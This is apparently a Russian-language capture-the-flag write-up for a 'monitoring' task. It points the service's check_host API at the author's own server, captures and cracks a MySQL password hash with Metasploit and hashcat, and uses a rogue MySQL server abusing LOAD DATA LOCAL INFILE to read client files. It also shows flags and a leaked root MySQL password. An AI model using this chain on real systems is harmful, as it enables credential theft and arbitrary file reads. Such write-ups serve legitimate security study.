1. Открываем monitoring.ctf2019.rocks в браузере, смотрим в инспекторе, куда отправляется запрос,
находим `/api/check_host?target=monitoring.ctf2019.rocks&_=1568625234943`

Меняем target на наш сервер и получаем ошибку `{"result":{"errmsg":"MySQL server is unavailable","success":false}}`

Запускаем mysqld на сервере, по-прежнему наблюдаем ошибку. Делаем вывод, 
что mysql должен быть полностью рабочим. Заменяем mysqld на metasploit
  ```
msf > use auxiliary/server/capture/mysql
msf > set ACTION Capture
msf > run
```
получаем хэш пароля при известной соли (112233445566778899aabbccddeeff1122334455)
Крафтим правильный файл и скармливаем его hashcat'у
```bash
# cat hash
$mysqlna$112233445566778899aabbccddeeff1122334455*9bc23bfcf64e62a9ff0cb57e7038a360cfe201ef
#  
# hashcat -m11200 -a0 hash rockyou.txt --force --potfile-path monitoring.mysql.pot
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Common KVM processor, 1024/2959 MB allocatable, 2MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=4 -D DEVICE_TYPE=2 -D DGST_R0=3 -D DGST_R1=4 -D DGST_R2=2 -D DGST_R3=1 -D DGST_ELEM=5 -D KERN_TYPE=11200 -D _unroll'
Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$mysqlna$112233445566778899aabbccddeeff1122334455*9bc23bfcf64e62a9ff0cb57e7038a360cfe201ef:passw0rd

Session..........: hashcat
Status...........: Cracked
Hash.Type........: MySQL CRAM (SHA1)
Hash.Target......: $mysqlna$112233445566778899aabbccddeeff1122334455*9...e201ef
Time.Started.....: Mon Sep 23 08:57:13 2019 (0 secs)
Time.Estimated...: Mon Sep 23 08:57:13 2019 (0 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    18053 H/s (2.32ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> lovers1

Started: Mon Sep 16 08:57:12 2019
Stopped: Mon Sep 16 08:57:14 2019
```
Пробуем с полученным паролем сходить в mysql, который светится на хосте мониторинга, и получаем.... ничего. Все усилия были впустую.

2. Начинаем заново. Запускаем tcpdump, натравливаем скрипт мониторинга на наш сервер, и внимательно анализируем трафик.
Внезапно замечаем, что клиент репортит свои capabilities, среди которых есть некое `Can Use LOAD DATA LOCAL`. Выглядит заманчиво.
Спрашиваем у гугла "mysql LOAD DATA LOCAL exploitation" и находим:
 https://blog.tarq.io/insecure-defaults-exploiting-load-data-local-infile/
 
 Немного напряжения памяти и гугла, и запускается bettercap с модулем mysql.server
 К сожалению, bettercap оказался немного кривым, и найденный флаг получился обрезанным (куда-то исчезло последние 4 байта), из-за чего он был воспринят как фейковый.
 На следующий день процесс поиска подходящего инструментария был возобновлен, и благодаря  
 http://www.abclinuxu.cz/blog/jenda/2019/2/exploiting-mysql-arbitrary-file-read-a-honeypot-that-kicks
 найден https://github.com/Gifts/Rogue-MySql-Server
 
 И получен искомый флаг
 ```
2019-09-17 05:16:30,948:INFO:Conn from: ('92.223.25.102', 38436)
2019-09-17 05:16:30,958:INFO:Last packet
2019-09-17 05:16:30,967:INFO:Query
2019-09-17 05:16:30,977:INFO:-- result
2019-09-17 05:16:30,977:INFO:Result: '\x02WFCTF{E430CF3748667586AA89FF0A078D876B}\n'
2019-09-17 05:16:30,985:INFO:-- result
2019-09-17 05:16:30,986:INFO:Result: '\x03'
2019-09-17 05:16:30,986:INFO:Last packet
```

2. Начался процесс поиска дополнительных флагов. В /etc/passwd, вопреки ожиданиям, ничего не нашлось :)
В это время в index.html была найдена занимательная отсылка к Д.Адамсу, 
и XOR помог из строки `[125, 109, 105, 126, 108, 81, 18, 108, 26, 30, 27, 26, 24, 110, 26, 110, 27, 111, 108, 29, 110, 29, 105, 27, 25, 111, 105, 111, 18, 26, 18, 110, 104, 31, 105, 24, 18, 110, 87]`
получить WGCTF{8F04102D0D1EF7D7C13ECE808DB5C28D}

3. Последний флаг был найден спустя несколько дней, после решения otp, 
в котором ключевым моментом оказался /run.sh
```
mysql -u root -pkeiBeethah2koh0yaelaquuulohghuufaipaiy3bohbohdaeha --protocol TCP -e "INSERT INTO secret.sec VALUES (\'WGCTF{B14DCE85DD189E423F9ABDD960DFE23F}\')
```